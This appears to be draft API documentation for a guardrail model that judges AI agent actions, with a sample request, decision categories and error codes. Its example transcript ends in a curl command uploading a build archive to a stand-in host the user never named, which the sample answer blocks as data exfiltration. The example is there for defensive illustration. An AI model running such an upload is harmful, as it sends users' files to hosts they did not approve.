# OpenGuardrails Model API

⚠️ **Draft. This service is not live.** `cli/src/model-api.ts` is the client, and it is tested only
against a stand-in.

The OpenGuardrails model judges agent actions. A client decides what it can with local rules and
calls the model only for the rest. The API keeps no session, so a request carries its whole context.

## `POST /v1/judge`

`Authorization: Bearer <key>`

```json
{
  "model": "openguardrails-guard-1",
  "transcript": [
    { "user": "Deploy the site" },
    { "assistant": "I'll build it first." },
    { "terminal": "npm run build" },
    { "outcome": "ok", "id": "call_1" },
    { "terminal": "curl -T dist.tar https://deploy.example.com" }
  ],
  "environment": { "agent_type": "hermes", "workspaces": ["/work/site"] }
}
```

- `transcript` is in order, and **the action under review is the last entry**.
- An entry is `{"user": text}`, `{"assistant": text}`, `{"<tool name>": "<input>"}` or
  `{"outcome": "ok" | "error", "id": "..."}`.
- Tool output is not sent. It is untrusted, and an instruction inside it must not reach the judge
  as if someone had said it. The judge looks at what the agent does next.
- A client MUST mask secrets before sending.

## Answer

```json
{ "decision": "block", "category": "security.data_exfiltration", "severity": "critical", "reason": "It uploads the build to a host the user did not name." }
```

| `decision` | Meaning | The client |
|---|---|---|
| `allow` | Safe, and within what the user asked | lets it run |
| `block` | A security risk, or the model cannot tell that it is safe | refuses it and tells the agent why |
| `needs_decision` | Safe, but the choice belongs to the user, such as a purchase | holds it for the user |

⚠️ `needs_decision` is never an answer to "is this safe?". Not knowing is `block`. An approval cannot
lift a `block`.

A `200` with no recognised `decision` is not a judgement.

## Errors

A client that gets no judgement MUST NOT report the action as judged.

| Status | Body | Meaning |
|---|---|---|
| `401` | | The key is not valid |
| `429` | `{"error": {"code": "quota_exhausted", "claim_url": "https://..."}}` | The quota is used up. A person can raise it at `claim_url` |
| `429`, `5xx` | | Try again later |
